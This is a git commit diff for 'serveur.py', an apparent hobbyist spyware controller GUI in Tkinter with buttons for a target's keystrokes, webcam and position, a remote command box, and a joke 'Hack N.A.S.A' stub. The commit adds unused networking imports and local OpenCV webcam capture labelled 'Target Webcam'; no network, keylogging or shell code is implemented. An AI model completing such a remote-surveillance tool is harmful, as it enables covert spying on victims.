179658e9e30b2a247d2cf0ed85aa5706618cf21c
Imperium <101398945+imperium9@users.noreply.github.com>
2022-03-24 17:45:51 +0100

    Update serveur.py

--- serveur.py
+++ serveur.py
@@ -1,31 +1,40 @@
-# This will import all the widgets
-# and modules which are available in
-# tkinter and ttk module
-#from curses.textpad import Textbox
+#bibliothèque graphiques
 from msilib.schema import ListBox
 from tkinter import *
 import tkinter.font
-#from tkinter.ttk import *
-#from turtle import bgcolor
+#bibliothèque réseau/système
+import cv2 as cv
+import socket
+import threading
+import sys
+import time
+from queue import Queue
 
-# creates a Tk() object
+# #################################################################################################################### #
+
+                                          # # # PARTIE RESEAU # # #
+
+# #################################################################################################################### #
+
+
+
+
+# #################################################################################################################### #
+
+                                          # # # PARTIE GRAPHIQUE # # #
+
+# #################################################################################################################### #
+
 master = Tk()
-
 # sets the geometry of main
 # root window
 master.title("Imperium")
 master.geometry("720x480")
-master.minsize(480,360)
+master.minsize(720,480)
+master.maxsize(720,480)
 master.iconbitmap("spyware-icon-3.ico")
 master.config(background="black")
 
-
-#style = Style()
- 
-#style.configure('TButton', font=('American typewriter', 14), background='black', foreground='green')
-#style.map('TButton', background=[('active', 'black')])
-# function to open a new window
-# on a button click
 def HackNasa():
 	pass
 def openPositionWindow():
@@ -67,7 +76,7 @@ def openCameraWindow():
 	
 	# Toplevel object which will
 	# be treated as a new window
-	newWindow = Toplevel(master)
+	"""newWindow = Toplevel(master)
 
 	# sets the title of the
 	# Toplevel widget
@@ -79,7 +88,30 @@ def openCameraWindow():
 	newWindow.geometry("480x480")
 
 	# A Label widget to show in toplevel
-	Label(newWindow,text ="Target's webcam:",font=("System", 17), bg='black',fg='green').pack()
+	Label(newWindow,text ="Target's webcam:",font=("System", 17), bg='black',fg='green').pack()"""
+	cap = cv.VideoCapture(0)
+	print(cap.isOpened())
+	print(cv.COLOR_BGR2GRAY)
+	if not cap.isOpened():
+		print("Cannot open camera")
+		exit()
+	while True:
+		# Capture frame-by-frame
+		ret, frame = cap.read()
+		# if frame is read correctly ret is True
+		if not ret:
+			print("Can't receive frame (stream end?). Exiting ...")
+			break
+		# Our operations on the frame come here
+		grey = cv.cvtColor(frame, 0)
+		
+		# Display the resulting frame
+		cv.imshow('Target Webcam', grey)
+		if cv.waitKey(1) == ord('q') or cv.waitKey(1) == ord('Q'):
+			break
+	# When everything done, release the capture
+	cap.release()
+	cv.destroyAllWindows()
 
 def openPhotoWindow():
 	
@@ -129,14 +161,14 @@ posbtn = Button(FrameHautDroit,
 			#style = 'W.TButton',
 			command = openPositionWindow)
 #posbtn.pack()
-posbtn.grid(ipadx=30,ipady=4,padx=50,pady=7,row=2,column=1,sticky = N)
+posbtn.grid(ipadx=32,ipady=4,padx=50,pady=7,row=2,column=1,sticky = N)
 
 keysbtn = Button(FrameHautDroit,
 			text ="Get Target Keys",font=("System", 15), bg='black',fg='green',
 			#style = 'W.TButton',
 			command = openKeysWindow)
 #keysbtn.pack()
-keysbtn.grid(ipadx=30,ipady=4,padx=50,pady=7,row=3,column=1,sticky = N)
+keysbtn.grid(ipadx=45,ipady=4,padx=50,pady=7,row=3,column=1,sticky = N)
 
 camerabtn = Button(FrameHautDroit,
 			text ="Get Target Webcam", font=("System", 15), bg='black',fg='green',
@@ -150,28 +182,29 @@ photobtn = Button(FrameHautDroit,
 			#style = 'W.TButton',
 			command = openPhotoWindow)
 #photobtn.pack()
-photobtn.grid(ipadx=30,ipady=4,padx=50,pady=7,row=5,column=1,sticky = N)
+photobtn.grid(ipadx=41,ipady=4,padx=50,pady=7,row=5,column=1,sticky = N)
 
 hacknasabtn = Button(FrameHautDroit,
 			text ="Hack N.A.S.A", font=("System", 15), bg='black',fg='green',
 			#style = 'W.TButton',
 			command = HackNasa)
 #photobtn.pack()
-hacknasabtn.grid(ipadx=30,ipady=4,padx=50,pady=7,row=6,column=1,sticky = N)
+hacknasabtn.grid(ipadx=58,ipady=4,padx=50,pady=7,row=6,column=1,sticky = N)
 
 label2 = Label(FrameBasGauche,text ="Target's Cmd :",font=("System", 17), bg='black',fg='green')
 label2.grid(row=3,column=0,sticky=W)
 textfromshell= ""
 distantshellinput = Entry(FrameBasGauche,font=("System", 17), bg='#021D09',fg='green')
 distantshellinput.grid(ipadx=4,pady=2,row=4,column=0,sticky = W)
-distantshellinput.insert(0,">>>")
+#distantshellinput.insert(0,">>>")
+
 distantshelloutput = Text(FrameHautDroit,font=("System", 17), bg='#021D09',fg='green',height=7,width=40)
-distantshelloutput.grid(ipadx=0,ipady=0,pady=2,row=8,column=1,sticky = N)
+distantshelloutput.grid(ipadx=0,ipady=10,pady=5,row=8,column=1,sticky = N)
 distantshelloutput.insert(END,"Output :")
 
 FrameHautGauche.grid(pady=10,row=0,column=0,sticky=N)
 FrameBasGauche.grid(padx=20,pady=370,row=0,column=0,sticky=W)
-FrameHautDroit.grid(pady=18,row=0,column=1,sticky=N)
+FrameHautDroit.grid(pady=12,row=0,column=1,sticky=N)
 FrameBasDroit.grid(row=1,column=1,sticky=N)
 # mainloop, runs infinitely
 mainloop()
